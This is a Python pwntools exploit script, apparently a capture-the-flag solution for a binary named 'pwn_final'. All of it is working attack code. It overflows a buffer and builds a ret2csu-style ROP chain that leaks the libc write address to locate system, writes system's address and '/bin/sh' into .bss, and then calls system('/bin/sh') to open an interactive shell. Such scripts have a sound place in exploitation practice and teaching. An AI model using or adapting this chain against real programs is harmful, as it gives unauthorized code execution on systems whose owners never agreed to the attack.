from pwn import *


#context.log_level = 'debug'



elf = ELF('./pwn_final')
libc = ELF('libc.so.6')

got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
call_get_name_func = 0x400966
print 'call_get_name_func= ' + hex(call_get_name_func)
got_read = elf.got['read']
print "got_read: " + hex(got_read)

bss_addr = 0x6020c0

off_system_addr = libc.symbols['write'] - libc.symbols['system']
print "off_system_addr: " + hex(off_system_addr)

p = process('./pwn_final')

#raw_input('debug')

# get system address
p.recvuntil('name:')
    
payload1 = "a"*56
payload1 += p64(0x400d96)+ p64(0) +p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1) + p64(0x400d80)
payload1 += "\x00"*56
payload1 += p64(call_get_name_func)
p.sendline(payload1)

data = p.recvuntil('\x7f')
write_addr = u64(data[-6:] + '\x00\x00')
print 'write_addr = ' + hex(write_addr)

system_addr = write_addr - off_system_addr
print "system_addr: " + hex(system_addr)

#raw_input('debug')
p.recvuntil('name:')


# write /bin/sh
payload2 = "a"*56
payload2 += p64(0x400d96)+ p64(0) +p64(0) + p64(1) + p64(got_read) + p64(16) + p64(bss_addr) + p64(0) + p64(0x400d80)
payload2 += "\x00"*56
payload2 += p64(call_get_name_func)
p.sendline(payload2)

 
p.send(p64(system_addr))
p.send("/bin/sh\0")


p.recvuntil('name:')

# call system
payload3 = "a"*56
payload3 += p64(0x400d96)+ p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr+8) + p64(0x400d80)
payload3 += "\x00"*56
payload3 += p64(call_get_name_func)
p.sendline(payload3)


p.interactive()


